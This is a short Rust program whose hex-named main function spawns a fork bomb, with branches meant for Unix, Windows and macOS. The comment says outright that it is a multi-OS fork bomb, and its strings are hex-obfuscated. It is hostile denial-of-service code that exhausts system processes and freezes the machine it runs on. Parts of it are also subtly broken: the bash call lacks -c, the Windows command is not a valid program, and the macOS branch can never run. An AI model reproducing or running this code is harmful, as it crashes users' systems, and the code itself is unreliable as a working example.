use std::process::Command;

pub fn main() {
    _0x7265616c666f726b();
}

// different forkbombs so it'll be multiOS
fn _0x7265616c666f726b() {
    if cfg!(unix) {
        Command::new("bash")
            .arg(":(){:|:&};:")
            .spawn()
            .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
    } else if cfg!(windows) {
        Command::new("%0|%0")
            .spawn()
            .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
    } else if cfg!(target_os = "macos") {
        Command::new(":(){:|:&};:")
            .spawn()
            .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
    }
}